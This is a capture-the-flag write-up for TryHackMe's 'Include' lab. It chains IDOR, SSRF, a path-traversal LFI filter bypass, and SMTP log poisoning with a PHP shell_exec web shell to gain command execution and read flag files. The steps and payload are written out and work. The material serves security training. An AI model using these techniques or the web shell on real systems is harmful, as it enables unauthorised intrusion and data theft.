# Include

A writeup for the room [Include](https://tryhackme.com/room/include) on TryHackMe.

> Use your server exploitation skills to take control of a web app.

<Image src={require("./logo.png").default} height="256" />

### What is the flag value after logging in to the SysMon app?

The first step is to scan the target with nmap:

```sh
nmap -sS TARGET_IP
```

<Image src={require("./1-1-nmap.png").default} />

The services on port 4000 and 50000 could be interesting:

```sh
nmap -A -p 4000,50000 TARGET_IP
```

<Image src={require("./1-2-nmap-4000.png").default} />

<Image src={require("./1-3-nmap-50000.png").default} />

They are both web servers. The one on port 4000 is a login page.

<Image src={require("./1-4-4000-index.png").default} />

The service on port 50000 is an admin panel.

<Image src={require("./1-5-50000-index.png").default} />

We can try to login to the website on port 4000 with guest:guest as credentials.

Once inside we can see a user profile page.

There are many properties and a form to add a new one.

By looking to the URL we can easily see that there is an IDOR vulnerability.

<Image src={require("./1-6-idor.png").default} />

There are two other users (2 and 3) but there is nothing to do with them.

Because there is a property called isAdmin set to false, we can try to change it.

<Image src={require("./1-7-admin.png").default} />

Once done new pages are available: API and Settings.

<Image src={require("./1-8-api.png").default} />

<Image src={require("./1-9-settings.png").default} />

The API page contains the details about two endpoints available for the user.

The endpoints are not directly accessible by us.

Inside the Settings page, we can see an input field to change the profile banner.

If we try to change the link we will see that the server will download the image and set as url its base64 encoding.

By giving one of the endpoints as a link, the server will download the content and show it to us.

This vulnerability is called Server-Side Request Forgery (SSRF).

<Image src={require("./1-10-endpoint-1.png").default} />

<Image src={require("./1-11-endpoint-2.png").default} />

We finally have access to the admin panel and obtain the first flag.

<Image src={require("./1-12-flag.png").default} />

### What is the content of the hidden text file in /var/www/html?

We can try to search for subpaths with gobuster:

```sh
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://TARGET_IP:50000
```

<Image src={require("./2-1-gobuster.png").default} />

Looking to the source code of the admin panel we can see that the profile image is loaded as `profile.php?img=profile.png`.

The image is inside the uploads folder.

<Image src={require("./2-2-uploads.png").default} />

We can try to change the link to `profile.php?img=../uploads/profile.png`.

However, the path in this way will not work.

If we play a bit with the link we can see that the server is removing in some way the first part.

By adding ...// multiple times we can bypass the filter and access the file.

This is an example of Local File Inclusion (LFI) vulnerability.

<Image src={require("./2-3-passwd.png").default} />

Looking to one of the available PHP file it is possible to notice that they are parsed by the server.

This means that if we can insert PHP code into a file, it can be executed, causing an RCE (Remote Code Execution).

A possible way is through log poisoning using for example the /var/mail/log file.

To insert something into this log file it is enough to send an email through the SMTP server.

```sh
telnet TARGET_IP 25
helo test
mail from: <?php echo shell_exec($_GET['cmd']); ?>
```

<Image src={require("./2-4-telnet.png").default} />

Now, by sending `&cmd=ls` as a parameter inside the final log file it will be possible to see the output of the command.

To find the hidden file we can use the following command:

```sh
&cmd=ls%20-a%20/var/www/html
```

<Image src={require("./2-5-files.png").default} />

Finally, we can read the content of the hidden file obtaining the second flag.

```sh
&cmd=cat%20/var/www/html/REDACTED
```

<Image src={require("./2-6-flag.png").default} />
